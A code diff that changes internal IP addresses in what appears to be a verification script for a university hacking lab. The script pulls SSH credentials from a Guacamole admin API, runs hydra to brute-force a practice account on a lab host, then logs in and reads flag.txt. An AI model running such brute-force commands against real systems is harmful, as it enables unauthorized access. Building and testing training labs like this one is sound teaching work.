@@ -37,7 +37,7 @@ def login_probe(client,user,password):
     code=("import paramiko\n"
           "c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n"
           "try:\n"
-          f" c.connect('192.168.146.137',port=2222,username={user!r},password={password!r},timeout=8,allow_agent=False,look_for_keys=False)\n"
+          f" c.connect('10.10.30.12',port=2222,username={user!r},password={password!r},timeout=8,allow_agent=False,look_for_keys=False)\n"
           " _,out,_=c.exec_command('cat flag.txt'); print(out.read().decode().strip())\n"
           "except paramiko.AuthenticationException: print('AUTH_REJECTED')\n"
           "finally: c.close()\n")
@@ -47,7 +47,7 @@ def login_probe(client,user,password):
 async def main():
     factory=make_session_factory(); engine=factory.kw['bind']; tag=uuid.uuid4().hex[:8]
     guac=make_guacamole_admin(); connections=await guac.list_connections()
-    kali=next(c for c in connections if c.hostname=='192.168.146.134' and c.protocol=='ssh')
+    kali=next(c for c in connections if c.hostname=='10.10.20.10' and c.protocol=='ssh')
     p=kali.parameters
     async with factory() as session:
         group=await session.scalar(select(StudentGroup).where(StudentGroup.code=='45HY'))
@@ -55,7 +55,7 @@ async def main():
         assert real_user
     permissions=await guac.get_user_permissions(real_user.username)
     client=paramiko.SSHClient(); client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    client.connect('192.168.146.134',port=int(p.get('port') or 22),username=p['username'],password=p['password'],timeout=8,allow_agent=False,look_for_keys=False)
+    client.connect('10.10.20.10',port=int(p.get('port') or 22),username=p['username'],password=p['password'],timeout=8,allow_agent=False,look_for_keys=False)
     ids=[]
     try:
         async with engine.connect() as connection:
@@ -103,7 +103,7 @@ async def main():
                 dictionary="printf '%s\\n' "+' '.join(shlex.quote(w) for w in info['wordlist'])+' > '+shlex.quote(path)
                 try:
                     remote(client,dictionary)
-                    output=remote(client,f'hydra -I -l {info["username"]} -P {path} -t 1 -f -s 2222 192.168.146.137 ssh')
+                    output=remote(client,f'hydra -I -l {info["username"]} -P {path} -t 1 -f -s 2222 10.10.30.12 ssh')
                     match=re.search(r'password:\s*(\S+)',output)
                     assert match,'Hydra no encontró la contraseña de la cuenta de práctica'
                     flag=login_probe(client,info['username'],match[1])
